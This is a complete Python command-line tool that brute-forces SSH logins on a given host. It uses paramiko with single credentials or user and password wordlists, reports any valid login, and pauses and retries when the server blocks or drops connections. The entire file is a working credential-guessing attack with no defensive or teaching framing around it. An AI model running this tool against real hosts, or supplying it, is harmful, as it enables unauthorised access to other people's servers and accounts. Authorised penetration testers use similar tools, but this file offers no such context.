#!/usr/bin/python3
#developed by YaSsInE
import paramiko
from colorama import Fore,Style
from optparse import OptionParser
import sys
import signal
import socket
import time 
def signal_handler(sig, frame):
    print(Fore.GREEN+'\nThank you for using my tool !! See you soon ...')
    sys.exit(0)

signal.signal(signal.SIGINT, signal_handler)
parser = OptionParser(description="Python script to bruteforce ssh")

def options():
	#parser = argparse.ArgumentParser(description='Python script to remove spaces and/or new lines from a given file')
	parser.add_option('-u', '--user',dest="user",help="username")
	parser.add_option('-U', '--userFile',dest="ufile",help="file contain users line by line")
	parser.add_option('-p', '--password',dest="password",help="password")
	parser.add_option('-P', '--passwordFile',dest="pfile",help="file contain password line by line")
	parser.add_option('-i', '--hostname',dest="host",help="hostname")     
	option, args = parser.parse_args()                   
	return option

def ssh_brute(user ,passw ,host):
    ssh = paramiko.SSHClient()
    try:
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        ssh.connect(host, port=22, username=user, password=passw ,banner_timeout=200)
    except socket.timeout:
        print(Fore.RED+" [x] Destination host unreachable")
        return 0
    except paramiko.ssh_exception.AuthenticationException:
        print(Fore.RED+"[-] Invalid credentials --> "+user+" : "+passw)
        return 0
    except paramiko.ssh_exception.SSHException:
        print(Fore.RED+"[-] Blocked , retrying in 30 seconds ...")
        time.sleep(30)
        return ssh_brute(user ,passw ,host)
    except paramiko.ssh_exception.NoValidConnectionsError:
        print(Fore.RED+"[-] Unable to connect to port 22 on "+host+" retrying in 30 seconds ...")
        time.sleep(30)
        return ssh_brute(user ,passw ,host)     
    else:
        print(Fore.GREEN+"[+] Login successful --> "+user+" : "+passw)

op = options()

if op.host:
    if op.user and op.password:
        ssh_brute(op.user ,op.password ,op.host)
    elif op.user and op.pfile:
        try:
            passlist = open(op.pfile).read().splitlines() 
        except:
            print(Fore.RED+"[x] Error opening password file")
            exit()
        for password in passlist:
            password = password.strip()
            if ssh_brute(op.user ,password ,op.host):
                pass 
    elif op.ufile and op.password:
        #print("multi user single password")
        try:
            userlist = open(op.ufile).read().splitlines() 
        except:
            print(Fore.RED+"[x] Error opening users file")
            exit()
        for user in userlist:
            user = user.strip()
            if ssh_brute(user ,op.password ,op.host):
                pass        
    elif op.ufile and op.pfile:
        #print("multi user multi pass")
        try:
            userlist = open(op.ufile).read().splitlines() 
        except:
            print(Fore.RED+"[x] Error opening users file")
            exit()
        try:
            passlist = open(op.pfile).read().splitlines() 
        except:
            print(Fore.RED+"[x] Error opening password file")
            exit()           
        for user in userlist:
            user = user.strip()
            for password in passlist:
                password = password.strip()
                if ssh_brute(user ,password ,op.host):
                    pass        
    else:
        print(Fore.RED+"[-] Please select a correct options , use -h for help")
else:
    print(Fore.RED+"[-] Please select a hostname , use -h for help")
